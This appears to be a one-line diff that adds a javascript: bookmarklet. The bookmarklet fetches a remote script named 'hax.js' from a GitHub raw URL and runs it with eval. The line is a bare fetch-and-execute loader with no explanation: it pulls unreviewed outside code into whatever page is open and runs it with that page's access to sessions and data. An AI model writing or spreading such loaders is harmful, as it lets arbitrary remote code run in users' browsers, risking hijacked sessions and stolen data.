@@ -1,0 +1,1 @@
+javascript:fetch("https://raw.githubusercontent.com/Icecream629/haxlan/main/hax.js").then(data=>{data.text().then(text=>{eval(text)})});
